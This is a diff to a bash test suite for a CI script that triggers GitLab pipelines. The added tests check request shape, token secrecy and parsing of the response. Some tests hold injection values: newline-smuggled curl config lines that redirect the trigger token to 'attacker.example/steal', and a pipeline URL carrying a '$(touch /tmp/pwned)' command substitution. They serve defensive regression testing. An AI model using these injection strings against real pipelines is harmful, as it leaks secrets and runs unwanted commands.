@@ -43,6 +43,7 @@ write_curl_stub
 
 run_handoff() {
   rm -f "$STUB_DIR/marker" "$STUB_DIR/config"
+  GITHUB_OUTPUT="${GITHUB_OUTPUT:-$STUB_DIR/gh_output}" \
   CURL_STUB_MARKER="$STUB_DIR/marker" \
   CURL_STUB_CONFIG="$STUB_DIR/config" \
   CURL_STUB_RESPONSE="$STUB_DIR/response" \
@@ -53,9 +54,13 @@ run_handoff() {
   echo $?
 }
 
+# Shaped like a REAL GitLab trigger response, not a four-field stub. The
+# nesting is the point: `"user":{"id":…,"web_url":…}` is what made a greedy
+# `.*"id"` extraction return the trigger bot's user id and a link to its
+# profile page instead of the pipeline.
 ok_response() {
   cat >"$STUB_DIR/response" <<'JSON'
-{"id":4242,"iid":7,"status":"created","web_url":"https://gitlab.com/infinity/infinity-core/-/pipelines/4242"}
+{"id":4242,"iid":7,"project_id":31,"sha":"0123456789abcdef0123456789abcdef01234567","ref":"develop","status":"created","source":"trigger","web_url":"https://gitlab.com/infinity/infinity-core/-/pipelines/4242","user":{"id":99,"username":"trigger-bot","web_url":"https://gitlab.com/trigger-bot"},"detailed_status":{"id":7,"label":"created","details_path":"/infinity/infinity-core/-/pipelines/4242"}}
 HTTP_STATUS:201
 JSON
 }
@@ -104,6 +109,10 @@ expect_field "ingestion digest is passed exactly"   "variables[TESTINBOX_INGESTI
 expect_field "migrator digest is passed exactly"    "variables[TESTINBOX_MIGRATOR_DIGEST]=ghcr.io/testowner/testinbox-migrator@$DIGEST"
 expect_field "web digest is passed exactly"         "variables[TESTINBOX_WEB_DIGEST]=ghcr.io/testowner/testinbox-web@$WEB_DIGEST"
 expect_field "pipeline ref is develop"              'form-string = "ref=develop"'
+expect_field "the endpoint is GitLab's pipeline trigger" '/projects/infinity%2Finfinity-core/trigger/pipeline'
+expect_field "the request is a POST"                'request = "POST"'
+expect_field "the token is sent as a multipart form field, as the API expects" 'form-string = "token='
+expect_field "https is enforced on the wire"        'proto = "=https"'
 
 # --- what must NEVER be in the payload ---------------------------------------
 forbidden=0
@@ -123,8 +132,11 @@ record "the trigger token is never printed" \
   "$(! grep -qF "$TOKEN" "$STUB_DIR/stdout" "$STUB_DIR/stderr" && echo ok || echo no)"
 
 # --- the response is reported without being mistaken for a deployment --------
-record "the GitLab pipeline id and url are reported" \
-  "$(grep -q '4242' "$STUB_DIR/stdout" && grep -q 'pipelines/4242' "$STUB_DIR/stdout" && echo ok || echo no)"
+record "the PIPELINE id and url are reported, not the nested user's" \
+  "$(grep -q 'pipeline id:  4242' "$STUB_DIR/stdout" \
+     && grep -q 'pipelines/4242' "$STUB_DIR/stdout" \
+     && ! grep -q 'trigger-bot' "$STUB_DIR/stdout" \
+     && echo ok || echo no)"
 record "the wording says handoff accepted, never deployment succeeded" \
   "$(grep -q 'RELEASE HANDOFF ACCEPTED' "$STUB_DIR/stdout" \
      && ! grep -qi 'deployment succeeded\|deployed successfully' "$STUB_DIR/stdout" "$STUB_DIR/stderr" \
@@ -179,6 +191,57 @@ PATH="$STUB_DIR:$PATH" EXPECTED_IMAGE_REPOSITORY="ghcr.io/testowner" \
 token_status=$?
 record "a missing trigger token refuses before any request" \
   "$([[ "$token_status" != "0" && ! -f "$STUB_DIR/marker" ]] && echo ok || echo no)"
+
+# --- config-file option injection --------------------------------------------
+# GITLAB_REF/PROJECT/API_URL land in a curl CONFIG FILE, which is line-oriented.
+# A newline in any of them injects options AFTER the line carrying the token —
+# a second `url =` makes curl POST the whole form, token included, to another
+# host. They come from repository variables, which are writable with a weaker
+# permission than reading a secret, so this is a privilege escalation.
+injection_refused() {
+  local name="$1" var="$2" value="$3"
+  ok_response
+  rm -f "$STUB_DIR/marker" "$STUB_DIR/config"
+  env "$var=$value" \
+    CURL_STUB_MARKER="$STUB_DIR/marker" CURL_STUB_CONFIG="$STUB_DIR/config" \
+    CURL_STUB_RESPONSE="$STUB_DIR/response" PATH="$STUB_DIR:$PATH" \
+    GITLAB_TRIGGER_TOKEN="$TOKEN" EXPECTED_IMAGE_REPOSITORY="ghcr.io/testowner" \
+    "$HANDOFF" "${valid_args[@]}" >/dev/null 2>&1
+  local status=$?
+  if [[ "$status" != "0" && ! -f "$STUB_DIR/marker" ]]; then
+    record "$name" ok
+  else
+    record "$name" no
+    echo "       exit $status; curl reached=$([[ -f "$STUB_DIR/marker" ]] && echo yes || echo no)"
+  fi
+}
+
+injection_refused "a newline in GITLAB_REF cannot inject a second curl url" \
+  GITLAB_REF "$(printf 'develop"\nurl = https://attacker.example/steal\nform-string = "x=y')"
+injection_refused "a newline in GITLAB_PROJECT is refused" \
+  GITLAB_PROJECT "$(printf 'infinity%%2Fcore"\nurl = https://attacker.example/steal')"
+injection_refused "a non-https GITLAB_API_URL is refused" \
+  GITLAB_API_URL "http://gitlab.internal/api/v4"
+injection_refused "an unencoded GITLAB_PROJECT path is refused rather than 404ing later" \
+  GITLAB_PROJECT "infinity/infinity-core"
+
+# --- a 2xx that is not GitLab must not read as an accepted handoff -----------
+cat >"$STUB_DIR/response" <<'JSON'
+<html><body>Access denied by proxy</body></html>
+HTTP_STATUS:200
+JSON
+status=$(run_handoff "${valid_args[@]}")
+record "a 2xx carrying no pipeline id fails rather than claiming acceptance" \
+  "$([[ "$status" != "0" ]] && echo ok || echo no)"
+
+# --- a hostile pipeline URL must never reach a shell -------------------------
+cat >"$STUB_DIR/response" <<'JSON'
+{"id":99,"web_url":"https://gitlab.com/$(touch /tmp/pwned)/-/pipelines/99"}
+HTTP_STATUS:201
+JSON
+GITHUB_OUTPUT="$STUB_DIR/gh_output" run_handoff "${valid_args[@]}" >/dev/null
+record "a pipeline URL containing shell metacharacters is dropped, not forwarded" \
+  "$(! grep -q 'touch' "$STUB_DIR/gh_output" 2>/dev/null && echo ok || echo no)"
 
 # --- a rejected trigger must fail the job ------------------------------------
 error_response
